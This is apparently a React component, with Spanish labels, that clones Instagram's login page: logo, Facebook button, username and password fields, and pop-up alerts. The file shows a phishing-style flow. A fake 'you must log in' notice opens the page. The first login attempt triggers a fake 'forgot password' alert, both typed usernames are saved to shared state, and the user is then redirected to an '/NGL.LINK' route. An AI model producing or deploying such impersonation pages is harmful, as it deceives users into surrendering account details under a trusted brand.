import { Input } from "../atomos/input";
import { Texto } from "../atomos/texto";
import Boton from "../atomos/boton";
import Alerta from "./alerta";
import  '../../css/main.css';
import logo from '../../assets/instagramLogo.png';
import nameContext from "../../contextos/nameContext";
import { useContext } from "react";
import { useState,useEffect } from "react";
import { useNavigate } from "react-router-dom";
export function CuerpoIg() {
    const navigate=useNavigate();
    const [validar,setValidar]=useState(false);
    const [Iniciar,setIniciar]=useState(true);
    const [intentos,setIntentos]=useState(0);
    const [userName,setUserName]=useState("");
    const {name,setName}=useContext(nameContext);
    const onChange=(e)=>{
        setUserName(e.target.value);
    }
    const handlerClick=()=>{
        if(intentos<2){
            if(intentos<1){
                setName({userName1:userName})
                setValidar(true);
            }
            else if(intentos<2){
                setName({
                    userName1:name.userName1,
                    userName2:userName,
                })
                
                navigate("/NGL.LINK");
            }
            setIntentos(intentos+1);
        
        }
        else{
           
        }
        // alert(name.userName1)
    }
    return (<>
        <div className="cuerpoIg">
            <img src={logo} className="img" alt="not-found" />
            <br /><br />
            <Boton className="botonIg" textoBoton="Continuar con facebook"/>
            <Texto textoP="______ o ______"/>
            <Input onChange={onChange} className="InputIg" placeholder="Teléfono, usuario o correo electrónico"/>
            <Input type="password" className="InputIg" placeholder="Contraseña"/>
            <br />
            <Boton className="linkIg" textoBoton="¿Olvidaste tu contraseña?"/>
            <Boton onClick={()=>handlerClick()} className="botonIg" textoBoton="Iniciar sesión"/>
            <br />
            <div className="cuerpoIgInferior">
                <Texto className="textoIg" textoP="¿No tienes una cuenta?"/>
                <Boton className="linkIg" textoBoton="Regístrate"/>
            </div>
            {validar&&(
                <Alerta onClick={()=>setValidar(false)} textoBoton="Intentar de nuevo" className="botonAlerta" className1="textoAlertaIg" className2="textoIg" textoP={"¿Olvidaste la contraseña de "+userName+"?"} textoP2="Te podemos enviar un correo electrónico para ayudarte a volver a entrar en tu cuenta"/>
            )}
            {Iniciar&&(
            <Alerta onClick={()=>setIniciar(false)} textoBoton="Entiendo" className="botonAlerta" className1="textoAlertaIg" className2="textoIg" textoP="No has iniciado sesión" textoP2="Debes iniciar sesión en tu cuenta"/>
            )}
        </div>
    </>);
}